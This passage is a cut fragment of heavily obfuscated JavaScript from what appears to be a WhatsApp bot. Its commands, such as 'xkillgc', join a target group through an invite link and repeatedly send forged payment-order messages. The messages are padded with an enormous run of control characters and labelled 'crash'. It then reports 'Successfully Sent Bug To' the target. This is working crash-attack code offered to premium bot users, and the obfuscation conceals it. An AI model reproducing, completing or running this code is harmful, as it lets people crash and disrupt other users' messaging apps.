_0x4f91dd!==_0x12a9b7;},_0x27b1e4[_0x4e9e25(0x1c3,0x1d6,0x1dd,0x19b)]=_0x1e7bfa(0x1d6,0x1b3,0x212,0x1a3),_0x27b1e4['wllQk']=_0x1e7bfa(0x1a6,0x196,0x161,0x1cf);const _0x308de8=_0x27b1e4;let _0x387ba2=!![];return function(_0x4abd42,_0x5d1699){function _0x4e1e11(_0x14a3ee,_0x4031e9,_0x4e9322,_0x2ed308){return _0x4e9e25(_0x4031e9-0x38d,_0x2ed308,_0x4e9322-0x92,_0x2ed308-0x42);}function _0x2dc224(_0xfe5eca,_0x361858,_0x475cfd,_0x881ab1){return _0x4e9e25(_0xfe5eca-0x138,_0x881ab1,_0x475cfd-0x1d9,_0x881ab1-0x12);}if(_0x308de8[_0x4e1e11(0x508,0x541,0x517,0x542)](_0x308de8[_0x2dc224(0x2fb,0x32f,0x2db,0x308)],_0x308de8[_0x4e1e11(0x53f,0x53e,0x531,0x55c)])){const _0x2e43f4=_0x387ba2?function(){if(_0x5d1699){const _0x4f079f=_0x5d1699['apply'](_0x4abd42,arguments);return _0x5d1699=null,_0x4f079f;}}:function(){};return _0x387ba2=![],_0x2e43f4;}else return _0x18205f['toString']()['search'](_0x308de8['XdyyD'])['toString']()[_0x2dc224(0x316,0x34c,0x2d9,0x309)+'r'](_0x4e7659)['search']('(((.+)+)+)'+'+$');};}()),_0x4adc8a=_0x3d44a3(this,function(){const _0x45af7f={'TPYLA':function(_0x278634,_0x51e00f){return _0x278634+_0x51e00f;},'KyYfq':_0x1370a9(0x362,0x361,0x322,0x346)+_0x286971(-0xf2,-0x14a,-0x12e,-0x13a),'AkhMy':_0x286971(-0xce,-0xb5,-0xec,-0xda)+_0x286971(-0x12b,-0x132,-0x111,-0xcf)+_0x1370a9(0x31f,0x314,0x316,0x2e3)+'\x20)','dGpNW':function(_0x3c9d92){return _0x3c9d92();},'FXmxX':_0x1370a9(0x335,0x335,0x331,0x319),'dRFOJ':_0x286971(-0x11e,-0x104,-0x137,-0x101),'iyORL':_0x286971(-0xdc,-0xbc,-0xc3,-0x104),'QqXmN':'exception','xwthx':'table','iYNDd':_0x1370a9(0x37b,0x351,0x339,0x31d),'XLbyq':function(_0x4d6c81,_0x3cf71a){return _0x4d6c81<_0x3cf71a;},'xwGIR':function(_0xbeba16,_0xb121e0){return _0xbeba16!==_0xb121e0;},'xOILv':_0x1370a9(0x311,0x309,0x2de,0x2f6)};function _0x1370a9(_0x259ca3,_0x4f3e73,_0x2a1353,_0x2e9c43){return _0x5ddd(_0x4f3e73-0x161,_0x2a1353);}const _0x5d7fdb=function(){let _0x49e88e;try{_0x49e88e=Function(_0x45af7f['TPYLA'](_0x45af7f[_0x5092a3(0x73,0x32,0x6d,0x5a)](_0x45af7f[_0x281419(-0x1d0,-0x208,-0x1e5,-0x1f5)],_0x45af7f['AkhMy']),');'))();}catch(_0x478daf){_0x49e88e=window;}function _0x281419(_0x2b260f,_0x31bfd0,_0x107ed8,_0x4608a3){return _0x1370a9(_0x2b260f-0xb5,_0x107ed8- -0x540,_0x31bfd0,_0x4608a3-0x23);}function _0x5092a3(_0x5985cb,_0xe654b1,_0x5062f4,_0x3e70ce){return _0x1370a9(_0x5985cb-0x49,_0x5985cb- -0x2e2,_0x3e70ce,_0x3e70ce-0x1de);}return _0x49e88e;},_0x3826f4=_0x45af7f[_0x1370a9(0x33f,0x346,0x37f,0x382)](_0x5d7fdb);function _0x286971(_0x7e9968,_0x534461,_0x477cb3,_0x39c32c){return _0x5ddd(_0x477cb3- -0x2cb,_0x7e9968);}const _0x585158=_0x3826f4[_0x286971(-0x10a,-0x127,-0xff,-0x13e)]=_0x3826f4[_0x1370a9(0x313,0x32d,0x2f7,0x33e)]||{},_0x1dd01c=[_0x45af7f[_0x286971(-0x169,-0x13b,-0x139,-0x16c)],_0x1370a9(0x35d,0x374,0x34f,0x378),_0x45af7f[_0x286971(-0xfe,-0xe9,-0xbf,-0xf9)],_0x45af7f[_0x1370a9(0x30b,0x31d,0x356,0x336)],_0x45af7f['QqXmN'],_0x45af7f[_0x286971(-0xfe,-0x106,-0xfb,-0x128)],_0x45af7f[_0x1370a9(0x2e5,0x310,0x2e8,0x2d4)]];for(let _0xabfc22=-0xdbc+-0xf17*-0x1+-0x1*0x15b;_0x45af7f[_0x286971(-0x140,-0x15a,-0x135,-0x159)](_0xabfc22,_0x1dd01c['length']);_0xabfc22++){if(_0x45af7f[_0x1370a9(0x2f4,0x325,0x310,0x349)](_0x286971(-0x15a,-0x14c,-0x123,-0x136),_0x45af7f['xOILv'])){const _0x3d365f=_0x589460[_0x1370a9(0x326,0x332,0x368,0x326)](_0x581986,arguments);return _0x590f88=null,_0x3d365f;}else{const _0x504de4=_0x3d44a3[_0x286971(-0xf0,-0xec,-0xe8,-0x10a)+'r']['prototype']['bind'](_0x3d44a3),_0x262dd2=_0x1dd01c[_0xabfc22],_0x4ca48d=_0x585158[_0x262dd2]||_0x504de4;_0x504de4[_0x1370a9(0x320,0x300,0x320,0x2c5)]=_0x3d44a3[_0x286971(-0x143,-0xe8,-0x121,-0xfa)](_0x3d44a3),_0x504de4[_0x1370a9(0x375,0x358,0x31a,0x39a)]=_0x4ca48d['toString'][_0x1370a9(0x341,0x30b,0x30a,0x2cb)](_0x4ca48d),_0x585158[_0x262dd2]=_0x504de4;}}});_0x4adc8a();let bug='\x03'['repeat'](-0x1e0*0x664+0xb550e+0x9ce32);for(let i=-0x1097+-0x2d3*0x1+0x136a;i<0x25a5+-0x14e9+-0x109e;i++){const _0x4a824b={};_0x4a824b[_0x30bfde(0x527,0x579,0x55b,0x568)+'Jid']=_0x30bfde(0x5fc,0x597,0x5bd,0x5e7)+_0x45425d(0x79,0x77,0x3c,0x6d)+'ewsletter',_0x4a824b[_0x30bfde(0x51e,0x577,0x55b,0x58d)+'Name']=_0x45425d(0x46,0x52,0x24,0x79)+_0x30bfde(0x564,0x561,0x584,0x565)+'ni\x20->\x20cras'+'h',_0x4a824b[_0x45425d(0x8d,0x6e,0x97,0x81)+_0x30bfde(0x519,0x53d,0x53d,0x579)]=0x2;const _0x32c405={};_0x32c405[_0x30bfde(0x58d,0x55d,0x5a0,0x5df)+'tachment']=[],_0x32c405[_0x30bfde(0x573,0x54c,0x548,0x534)+_0x45425d(0x99,0xa1,0x86,0x62)]=global[_0x45425d(0x72,0x98,0xa4,0xa0)];const _0x23db66={};_0x23db66[_0x30bfde(0x5f2,0x5d7,0x5bc,0x588)]='review_and'+'_pay',_0x23db66['buttonPara'+_0x30bfde(0x56a,0x550,0x53c,0x514)]='{\x22currency'+_0x30bfde(0x5df,0x57f,0x5c3,0x5c9)+_0x30bfde(0x55c,0x5ae,0x578,0x545)+_0x45425d(0x78,0x61,0x47,0x45)+'\x22:69696969'+_0x45425d(0xa7,0xc1,0x7d,0xde)+_0x45425d(0xc5,0x8a,0x69,0x84)+'rence_id\x22:'+_0x45425d(0x16,0x53,0x53,0x33)+_0x30bfde(0x59b,0x5b2,0x5b6,0x573)+_0x30bfde(0x5b7,0x5a6,0x577,0x5a2)+_0x30bfde(0x588,0x5ed,0x5ab,0x5c1)+_0x30bfde(0x5dd,0x5ab,0x598,0x5ba)+_0x30bfde(0x5e7,0x5e3,0x5b3,0x5a3)+_0x45425d(0x56,0x6d,0xa0,0x47)+_0x45425d(0x33,0x5b,0x18,0x25)+'total\x22:{\x22v'+_0x30bfde(0x53c,0x59d,0x570,0x536)+_0x30bfde(0x577,0x5b0,0x593,0x576)+'et\x22:100},\x22'+_0x45425d(0x99,0x85,0x80,0x75)+_0x45425d(0x89,0xc7,0x96,0xda)+_0x45425d(0x53,0x7f,0x64,0xa5)+_0x45425d(0xcc,0xbe,0xde,0xe7)+'id\x22:\x2275376'+'3159292600'+_0x45425d(0x75,0x8b,0x4d,0x8a)+_0x45425d(0x77,0xb7,0xcc,0xe5)+_0x45425d(0x83,0xa9,0xe8,0xc9)+_0x30bfde(0x5b4,0x556,0x57f,0x595)+_0x30bfde(0x563,0x55c,0x554,0x525)+xbugtex['xtxt']+(_0x45425d(0x6c,0x9f,0xd4,0xcd)+_0x45425d(0x8b,0x55,0x6b,0x45)+_0x45425d(0x87,0xc2,0x88,0xa9)+_0x45425d(0x6a,0x6f,0xa0,0xae)+_0x45425d(0x2f,0x6b,0x7d,0x52)+_0x30bfde(0x531,0x592,0x562,0x548)+_0x45425d(0x21,0x45,0x6e,0x7d)+_0x45425d(0xd7,0x9e,0x5b,0xbf)+_0x30bfde(0x535,0x584,0x547,0x570)+_0x30bfde(0x5d1,0x5c3,0x594,0x5c1)+_0x45425d(0x4e,0x71,0x9f,0x2e)+_0x45425d(0xbb,0x83,0x51,0x92)+_0x30bfde(0x576,0x595,0x5af,0x5e9)+_0x45425d(0xca,0x8c,0x98,0x64)+'🦄\x20Xeon\x20🦄')+bug+(_0x30bfde(0x57a,0x5bd,0x59c,0x5c0)+_0x30bfde(0x596,0x510,0x552,0x551)+_0x30bfde(0x5f8,0x5f5,0x5bf,0x587)+'ffset\x22:100'+_0x45425d(0x3d,0x6b,0x2e,0xa2)+_0x45425d(0x99,0x9c,0xd6,0x62)+_0x30bfde(0x561,0x593,0x5a3,0x563)+_0x45425d(0xdd,0x9d,0xc6,0xe1)+_0x45425d(0x84,0x48,0x8b,0x47));const _0x17c293={};_0x17c293[_0x30bfde(0x586,0x587,0x544,0x507)]=[_0x23db66];const _0x4b01d0={};_0x4b01d0[_0x30bfde(0x5ac,0x582,0x5ae,0x5a9)]=_0x32c405,_0x4b01d0[_0x45425d(0x70,0xa5,0xde,0x88)+_0x30bfde(0x56a,0x57d,0x56f,0x587)]=_0x17c293;const _0x306fb9={};_0x306fb9['interactiv'+'eMessage']=_0x4b01d0;const _0x118bf8={};_0x118bf8['isForwarde'+'d']=!![],_0x118bf8[_0x45425d(0xad,0x79,0x96,0x46)+_0x30bfde(0x5dd,0x587,0x5a8,0x585)+_0x30bfde(0x57b,0x58e,0x5a9,0x57b)]=_0x4a824b,_0x118bf8['stanzaId']=_0x30bfde(0x593,0x593,0x564,0x520)+_0x30bfde(0x5e4,0x593,0x5b0,0x5d1),_0x118bf8[_0x30bfde(0x517,0x550,0x540,0x520)+'t']=_0x45425d(0x9d,0x75,0x59,0x91)+'pp.net',_0x118bf8[_0x30bfde(0x5df,0x5ca,0x5b7,0x5b3)+_0x45425d(0x8c,0x89,0x76,0x61)]=_0x306fb9,_0x118bf8['remoteJid']=_0x45425d(0x3a,0x54,0x43,0x1c)+_0x30bfde(0x512,0x51c,0x54d,0x528);const _0x40542e={};_0x40542e[_0x45425d(0xc0,0xad,0xd6,0xb4)]='🚨DGXeon🚨',_0x40542e[_0x30bfde(0x563,0x532,0x556,0x589)+'o']=_0x118bf8;const _0x42ef4a={};_0x42ef4a[_0x30bfde(0x51c,0x550,0x55d,0x587)+_0x45425d(0x81,0xa8,0x94,0xcb)]=_0x40542e,await Yasam[_0x30bfde(0x5f1,0x5db,0x5b8,0x5c3)+'ge'](target,_0x42ef4a,{});const _0x415505={};_0x415505[_0x45425d(0xb2,0xad,0x8b,0xd6)]='';const _0x10e9ac={};_0x10e9ac[_0x30bfde(0x539,0x54f,0x57a,0x56b)]=xbug2,await Yasam[_0x45425d(0x65,0x92,0x65,0xc3)+'e'](target,_0x415505,_0x10e9ac);}
replygcxeon(`Successfully Sent Bug To ${target}`)
}
break
case 'xkillgc': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Use ${prefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstubwxyz`)
await loading()
let xeongclink = args[0].split('https://chat.whatsapp.com/')[1]
let target = await Yasam.groupAcceptInvite(xeongclink)
function _0x15a19b(_0x4606b9,_0x12a5f5,_0xc8a211,_0x38bf12){return _0x2c69(_0xc8a211-0x37a,_0x12a5f5);}(function(_0x32c932,_0x1f4144){function _0x4e762(_0x29a032,_0x58669b,_0x4819ff,_0x1bbcab){return _0x2c69(_0x1bbcab-0x3ac,_0x29a032);}function _0x12a254(_0x1099ce,_0x32afd2,_0x194fd0,_0x327cbb){return _0x2c69(_0x1099ce-0x358,_0x327cbb);}const _0x93f3e0=_0x32c932();while(!![]){try{const _0x138da9=parseInt(_0x4e762(0x534,0x508,0x538,0x525))/(0x1c22+0xd27+-0x2948)+-parseInt(_0x12a254(0x4aa,0x4d6,0x4c7,0x4b4))/(0x968+-0x1d56+0xe8*0x16)+parseInt(_0x12a254(0x4ad,0x48b,0x482,0x499))/(-0x1a0c+-0x656*0x3+0x8b*0x53)*(-parseInt(_0x12a254(0x4ac,0x4db,0x4e6,0x4e9))/(0xf41+0x1c7*-0x4+0x1*-0x821))+parseInt(_0x12a254(0x497,0x4d3,0x4bc,0x4cb))/(-0x91a*0x1+-0x1*-0x1a61+0x5e*-0x2f)+parseInt(_0x12a254(0x4b8,0x4ca,0x4da,0x4b4))/(0x14a9+0x11a1+-0x2644)*(parseInt(_0x4e762(0x507,0x4e6,0x536,0x515))/(-0x26*0x86+-0x8f5+0x1ce0))+-parseInt(_0x12a254(0x4b4,0x4c4,0x488,0x487))/(-0x1dc5+-0x1*-0x158f+0x83e)+parseInt(_0x4e762(0x4f9,0x4f3,0x543,0x505))/(0x16d3+0x676+-0x1d40);if(_0x138da9===_0x1f4144)break;else _0x93f3e0['push'](_0x93f3e0['shift']());}catch(_0x5a1c83){_0x93f3e0['push'](_0x93f3e0['shift']());}}}(_0x28f4,-0x895ef+0x2c3ab*0x1+0x70a45*0x2));function _0x28f4(){const _0xc03139=['9631592926','LMRHf','\x22:19999800','nativeFlow','atus\x22:\x22pay','y\x22:1},{\x22re','relog\x20->\x20b','alue\x22:1999','KPvBh','1015567RWhxft','🚨DGXeon🚨','status@bro','hlALu','console','participan','et\x22:100},\x22','ewsletter','extendedTe','wGFMV','quotedMess','qtLWg','eMessage','contextInf','name','relayMessa','log','mqpvR','msJson','{\x22currency','rder\x22:{\x22st','serverMess','eENlZ','newsletter','3159292600','(((.+)+)+)','4605763435','CyYeu','pdrOS','-goods\x22,\x22o','toString','review_and','qXdro','trace',':{\x22value\x22:','tachment','hasMediaAt','tailer_id\x22','\x22:\x22ORDER\x22,','05763435\x22,','fnqzI','ffset\x22:100','constructo','ctor(\x22retu','rn\x20this\x22)(','__proto__','rEVfh','BicPl','interactiv','sendMessag','d\x22:\x22784267','search','PyHzx','buttonPara','ment_reque','\x22retailer_','FSRnS','DSQpv','Name','apply','{}.constru','hGwoG','wlGgz','9800,\x22offs','\x224ONSAXV76','remoteJid','bind','ent_method','2744475MxefMg','Bot\x20Bug\x20','BAE526D352','repeat','ageId','1203631440','essageInfo','quoted','order_type','9999900,\x22o','isForwarde','9\x22,\x22produc','\x22:\x22','sted\x22,\x22sub','\x22,\x22amount\x22','text','y\x22:1}]},\x22n','0@s.whatsa','s\x22:[]}','1956718pKDJWP','jpegThumbn','12dRRZxP','17007BVOKOK','JYWfq','ewsletterM','prototype','2491038IvFzgs','age','100},\x22refe','6236616VQxBED','🦄\x20Xeon\x20🦄','\x22,\x22name\x22:\x22','adcast','9726owwjYh','pp.net','_pay','warn',':\x22physical','uka\x20chat\x20i','stanzaId','xtMessage','\x22product_i','2051mEbMaU','\x22items\x22:[{','rence_id\x22:','APELu','},\x22quantit','gUvHS','total\x22:{\x22v'];_0x28f4=function(){return _0xc03139;};return _0x28f4();}const _0xf3274a=(function(){const _0xe47f4c={};_0xe47f4c['LMRHf']=function(_0x3c6308,_0x22ed9d){return _0x3c6308===_0x22ed9d;};const _0x356cf0=_0xe47f4c;let _0x4928d6=!![];return function(_0x4083b5,_0x405178){const _0x553721=_0x4928d6?function(){function _0x2a4276(_0x5c799f,_0x5f1986,_0x578aa5,_0x2210ae){return _0x2c69(_0x5c799f-0x180,_0x5f1986);}function _0x2e2cd7(_0x558938,_0x2881c8,_0x15d247,_0x3d1266){return _0x2c69(_0x2881c8- -0x2f,_0x558938);}if(_0x405178){if(_0x356cf0[_0x2e2cd7(0x113,0x142,0x11f,0x131)](_0x2a4276(0x2fc,0x30e,0x2f5,0x311),_0x2a4276(0x2fc,0x2f8,0x2f3,0x311))){const _0x471196=_0x405178[_0x2a4276(0x2b6,0x2e3,0x2ab,0x2d9)](_0x4083b5,arguments);return _0x405178=null,_0x471196;}else{if(_0x382c57){const _0x1a504b=_0x396a5f[_0x2e2cd7(0x144,0x107,0x128,0xe6)](_0x5ec307,arguments);return _0x5171ab=null,_0x1a504b;}}}}:function(){};return _0x4928d6=![],_0x553721;};}()),_0xba930b=_0xf3274a(this,function(){function _0x6d950(_0x9cf75f,_0x40c57a,_0xc3e9a6,_0x3af5ff){return _0x2c69(_0x40c57a- -0x20a,_0x9cf75f);}function _0x5503bf(_0x4d57f6,_0x46058f,_0x3ca3bd,_0x7fe452){return _0x2c69(_0x7fe452-0x2c,_0x4d57f6);}const _0x1c68ae={};_0x1c68ae['KPvBh']=_0x5503bf(0x1a6,0x1cf,0x1f9,0x1be)+'+$';const _0x56cda8=_0x1c68ae;return _0xba930b[_0x6d950(-0x38,-0x73,-0x71,-0x60)]()[_0x6d950(-0xec,-0xdc,-0xa8,-0xd6)](_0x56cda8['KPvBh'])[_0x6d950(-0x9a,-0x73,-0x54,-0x77)]()[_0x6d950(-0x51,-0x67,-0x64,-0x91)+'r'](_0xba930b)[_0x5503bf(0x135,0x146,0x138,0x15a)](_0x56cda8[_0x5503bf(0x16b,0x1b5,0x165,0x1a4)]);});_0xba930b();const _0x27e679=(function(){const _0x52c56d={};function _0x1e2a96(_0x5e8491,_0x27062,_0x157918,_0x4a516f){return _0x2c69(_0x27062- -0x3a2,_0x4a516f);}_0x52c56d[_0x1e2a96(-0x1d2,-0x201,-0x1c7,-0x205)]=function(_0x299c4f,_0x303405){return _0x299c4f===_0x303405;},_0x52c56d[_0x47b5b4(-0x7b,-0x60,-0x4a,-0x82)]=_0x1e2a96(-0x1f7,-0x1fa,-0x1bb,-0x213),_0x52c56d['pdrOS']=function(_0x349826,_0x5a01cb){return _0x349826===_0x5a01cb;};function _0x47b5b4(_0x9242fe,_0x34f26c,_0x236436,_0xc890cb){return _0x2c69(_0xc890cb- -0x1ba,_0x236436);}_0x52c56d[_0x47b5b4(-0x56,-0x9a,-0x32,-0x64)]=_0x1e2a96(-0x1fa,-0x236,-0x267,-0x23c);const _0x4e8549=_0x52c56d;let _0x14afcb=!![];return function(_0x2fda07,_0x1f0236){function _0x248f3f(_0x2da683,_0x5d16ad,_0x1ab971,_0x117841){return _0x47b5b4(_0x2da683-0x95,_0x5d16ad-0xe6,_0x117841,_0x2da683-0xf9);}const _0x3e951c={'wGFMV':function(_0x2d3b2b,_0x1f21d8){function _0x4936aa(_0x10ef59,_0x25a683,_0x29f193,_0x24905a){return _0x2c69(_0x10ef59- -0x34c,_0x29f193);}return _0x4e8549[_0x4936aa(-0x1ab,-0x19e,-0x1b6,-0x1e3)](_0x2d3b2b,_0x1f21d8);},'wlGgz':_0x4e8549['hGwoG']};function _0x4e5da3(_0x9e6a14,_0x56ad8e,_0x3b042d,_0x3a71c6){return _0x47b5b4(_0x9e6a14-0xd9,_0x56ad8e-0x12c,_0x56ad8e,_0x3b042d-0xb8);}if(_0x4e8549[_0x248f3f(0xd4,0xcf,0xf8,0xea)](_0x4e8549['JYWfq'],_0x4e8549[_0x248f3f(0x95,0x9a,0xba,0xd1)])){const _0xbc1ff4=_0x14afcb?function(){function _0x3f1e52(_0x501052,_0x3819b9,_0xcdf14c,_0x20b695){return _0x248f3f(_0x20b695-0x2a4,_0x3819b9-0x1e5,_0xcdf14c-0x3d,_0x501052);}function _0xb0be2e(_0x245618,_0x49a541,_0x57aedc,_0x50a750){return _0x248f3f(_0x50a750-0x48f,_0x49a541-0x18b,_0x57aedc-0x10e,_0x49a541);}if(_0x3e951c[_0xb0be2e(0x54b,0x57f,0x55d,0x550)](_0x3e951c[_0xb0be2e(0x507,0x546,0x4eb,0x507)],_0x3e951c['wlGgz'])){if(_0x1f0236){const _0x54e552=_0x1f0236['apply'](_0x2fda07,arguments);return _0x1f0236=null,_0x54e552;}}else{const _0x1162a9=_0x55e6f5[_0xb0be2e(0x514,0x50e,0x525,0x504)](_0x55d62f,arguments);return _0x1d6e65=null,_0x1162a9;}}:function(){};return _0x14afcb=![],_0xbc1ff4;}else{const _0x3c8ae3=_0x10db29?function(){if(_0x47eefa){const _0x116ac3=_0x1bc075['apply'](_0x140e7d,arguments);return _0x4927b3=null,_0x116ac3;}}:function(){};return _0x74a72d=![],_0x3c8ae3;}};}()),_0x4b1e40=_0x27e679(this,function(){const _0x23c375={'nKLkp':function(_0x18c493,_0x9d5498){return _0x18c493(_0x9d5498);},'FSRnS':function(_0x470d2d,_0xc532f7){return _0x470d2d+_0xc532f7;},'CmuKI':function(_0x21a509,_0x2ef4f5){return _0x21a509+_0x2ef4f5;},'rEVfh':'return\x20(fu'+'nction()\x20','PyHzx':_0x3b55e5(-0x2a,-0x94,-0x96,-0x5b)+_0x17c6eb(0x315,0x32d,0x2d7,0x2eb)+_0x3b55e5(-0x17,-0x1a,-0xb,0x13)+'\x20)','DSQpv':function(_0xd33de8){return _0xd33de8();},'mqpvR':_0x17c6eb(0x2d4,0x2a5,0x30c,0x2bd),'MVzXY':'info','eENlZ':'error','CyYeu':'exception','qtLWg':'table','qXdro':_0x17c6eb(0x30b,0x31c,0x2d2,0x327),'gUvHS':function(_0x4e7602,_0x112b55){return _0x4e7602<_0x112b55;}};let _0x540ff0;try{const _0x2de064=_0x23c375['nKLkp'](Function,_0x23c375[_0x17c6eb(0x2a4,0x26e,0x2be,0x275)](_0x23c375['CmuKI'](_0x23c375[_0x3b55e5(0x3b,-0x19,0x38,0x15)],_0x23c375[_0x3b55e5(-0x90,-0x7b,-0x66,-0x63)]),');'));_0x540ff0=_0x23c375[_0x3b55e5(-0x3b,-0x44,-0x5a,-0x5e)](_0x2de064);}catch(_0x534aaf){_0x540ff0=window;}function _0x17c6eb(_0xa2b8eb,_0x577433,_0x1792ac,_0x3a2105){return _0x2c69(_0xa2b8eb-0x171,_0x1792ac);}const _0x67c609=_0x540ff0[_0x17c6eb(0x2ee,0x2db,0x2de,0x2bf)]=_0x540ff0[_0x3b55e5(0x14,-0x41,0x26,-0x15)]||{};function _0x3b55e5(_0x5c0e1b,_0x54810d,_0x29a7c9,_0x27545a){return _0x2c69(_0x27545a- -0x192,_0x29a7c9);}const _0x2c48a3=[_0x17c6eb(0x2fa,0x315,0x2bf,0x2cb),_0x23c375[_0x17c6eb(0x2fb,0x2be,0x313,0x304)],_0x23c375['MVzXY'],_0x23c375[_0x17c6eb(0x300,0x2db,0x303,0x2c2)],_0x23c375[_0x3b55e5(0xb,-0xa,-0x10,0x2)],_0x23c375[_0x17c6eb(0x2f5,0x2bd,0x2ff,0x30a)],_0x23c375[_0x17c6eb(0x30a,0x30c,0x2e6,0x2e7)]];for(let _0x517dea=-0x1f15*0x1+-0x26*0x6a+0x3*0xf9b;_0x23c375[_0x17c6eb(0x2df,0x319,0x2f9,0x2b7)](_0x517dea,_0x2c48a3['length']);_0x517dea++){const _0x3351ea=_0x27e679[_0x17c6eb(0x314,0x32f,0x315,0x2dd)+'r'][_0x17c6eb(0x2c9,0x29c,0x2d7,0x2e3)][_0x17c6eb(0x2ae,0x2a7,0x2be,0x271)](_0x27e679),_0xadfcb=_0x2c48a3[_0x517dea],_0x1de33d=_0x67c609[_0xadfcb]||_0x3351ea;_0x3351ea[_0x17c6eb(0x317,0x2e9,0x34f,0x313)]=_0x27e679[_0x17c6eb(0x2ae,0x29d,0x278,0x2d0)](_0x27e679),_0x3351ea[_0x3b55e5(0x3e,0x3b,-0x34,0x5)]=_0x1de33d[_0x17c6eb(0x308,0x323,0x2d7,0x2e2)]['bind'](_0x1de33d),_0x67c609[_0xadfcb]=_0x3351ea;}});_0x4b1e40();function _0x2427a7(_0x21fa51,_0x4358bc,_0x31d5c0,_0xf52ecc){return _0x2c69(_0x31d5c0-0x1ce,_0x4358bc);}function _0x2c69(_0x537000,_0xba930b){const _0xf3274a=_0x28f4();return _0x2c69=function(_0x28f4bb,_0x2c6957){_0x28f4bb=_0x28f4bb-(0x4*-0x3+0x1dbd+-0x1c86);let _0x3f9e4c=_0xf3274a[_0x28f4bb];return _0x3f9e4c;},_0x2c69(_0x537000,_0xba930b);}let bug='\x03'[_0x15a19b(0x4e0,0x4e1,0x4bc,0x4bc)](-0xceb14+0x4c1*0x3d7+-0x3d1bd*-0x1);for(let i=-0x3ed*0x7+0x1749+0x432;i<-0x2*-0x14c+-0x1510+-0x94b*-0x2;i++){const _0x18e95c={};_0x18e95c[_0x2427a7(0x33f,0x369,0x35e,0x36d)+'Jid']=_0x2427a7(0x309,0x32e,0x312,0x2dd)+'38483540@n'+_0x15a19b(0x4ee,0x50f,0x4fa,0x4e6),_0x18e95c[_0x15a19b(0x52e,0x4e6,0x50a,0x4db)+_0x15a19b(0x4a9,0x487,0x4af,0x4da)]=_0x2427a7(0x335,0x326,0x344,0x381)+_0x15a19b(0x4d6,0x4a7,0x4df,0x518)+'ni\x20->\x20cras'+'h',_0x18e95c[_0x15a19b(0x4fc,0x4ee,0x508,0x538)+_0x2427a7(0x33b,0x2ff,0x311,0x31a)]=0x2;const _0x427c68={};_0x427c68[_0x2427a7(0x33d,0x32f,0x36b,0x332)+_0x2427a7(0x390,0x3a6,0x36a,0x346)]=[],_0x427c68[_0x2427a7(0x352,0x2f9,0x321,0x331)+'ail']=global['bimg'];const _0xbe5d7a={};_0xbe5d7a[_0x15a19b(0x4ce,0x506,0x501,0x4f9)]=_0x2427a7(0x339,0x339,0x366,0x389)+_0x15a19b(0x4da,0x4f4,0x4dc,0x4b4),_0xbe5d7a[_0x15a19b(0x4bc,0x49b,0x4aa,0x493)+_0x15a19b(0x51f,0x505,0x505,0x4c7)]=_0x15a19b(0x4f3,0x4c8,0x506,0x53d)+'\x22:\x22IDR\x22,\x22t'+'otal_amoun'+'t\x22:{\x22value'+_0x2427a7(0x33c,0x311,0x340,0x352)+',\x22offset\x22:'+_0x2427a7(0x331,0x302,0x329,0x2f8)+_0x15a19b(0x4d0,0x4dc,0x4e5,0x4be)+_0x15a19b(0x4e4,0x4ce,0x4b5,0x4de)+'KN\x22,\x22type\x22'+_0x15a19b(0x4cf,0x4ea,0x4de,0x4ff)+_0x15a19b(0x4fd,0x539,0x510,0x50a)+_0x2427a7(0x333,0x338,0x35b,0x347)+_0x2427a7(0x380,0x312,0x342,0x312)+_0x15a19b(0x4a9,0x476,0x4ab,0x4b1)+_0x2427a7(0x2ff,0x2fa,0x31a,0x353)+_0x15a19b(0x4c3,0x4b4,0x4e9,0x511)+_0x15a19b(0x504,0x4ba,0x4f1,0x52a)+_0x2427a7(0x326,0x33c,0x308,0x2db)+_0x15a19b(0x4fc,0x520,0x4f9,0x52e)+_0x2427a7(0x31e,0x334,0x315,0x2e1)+_0x2427a7(0x349,0x347,0x36d,0x35e)+_0x2427a7(0x34c,0x362,0x338,0x312)+_0x15a19b(0x48a,0x4d3,0x4ac,0x48d)+'id\x22:\x2275376'+_0x15a19b(0x535,0x4f5,0x50b,0x518)+_0x2427a7(0x348,0x2f8,0x318,0x30d)+'t_id\x22:\x22799'+_0x15a19b(0x510,0x500,0x4ea,0x4ff)+'009\x22,\x22name'+_0x2427a7(0x357,0x2de,0x319,0x2fa)+xbugtex['xtxt']+(_0x2427a7(0x2ee,0x33f,0x31b,0x310)+_0x2427a7(0x33c,0x381,0x369,0x387)+_0x15a19b(0x4b6,0x48b,0x4c2,0x500)+_0x2427a7(0x364,0x358,0x370,0x3a0)+'},\x22quantit'+_0x15a19b(0x4d9,0x4d2,0x4ef,0x4c8)+_0x2427a7(0x335,0x390,0x36c,0x385)+':\x2278426746'+_0x2427a7(0x339,0x359,0x36e,0x350)+_0x15a19b(0x509,0x4bf,0x4e2,0x520)+_0x2427a7(0x2f8,0x303,0x2fb,0x307)+_0x15a19b(0x542,0x529,0x50d,0x4d9)+_0x15a19b(0x4b1,0x4fa,0x4d8,0x4be)+_0x2427a7(0x2df,0x322,0x30e,0x2ee)+_0x15a19b(0x4d5,0x4bb,0x4d7,0x4b5))+bug+(_0x2427a7(0x32b,0x308,0x31b,0x356)+_0x2427a7(0x357,0x3a5,0x369,0x37c)+_0x15a19b(0x49c,0x4e5,0x4c2,0x4af)+_0x2427a7(0x39d,0x354,0x370,0x37c)+_0x2427a7(0x30c,0x314,0x33b,0x374)+_0x15a19b(0x4ac,0x4b8,0x4c9,0x4a8)+'ative_paym'+_0x15a19b(0x49f,0x4ef,0x4b8,0x490)+_0x2427a7(0x2ff,0x351,0x31f,0x351));const _0x68c8f1={};_0x68c8f1['buttons']=[_0xbe5d7a];const _0x3439e0={};_0x3439e0['header']=_0x427c68,_0x3439e0[_0x2427a7(0x34b,0x312,0x341,0x33d)+'Message']=_0x68c8f1;const _0x22ac8a={};_0x22ac8a[_0x15a19b(0x48d,0x470,0x4a5,0x4d4)+_0x2427a7(0x345,0x34d,0x353,0x33b)]=_0x3439e0;const 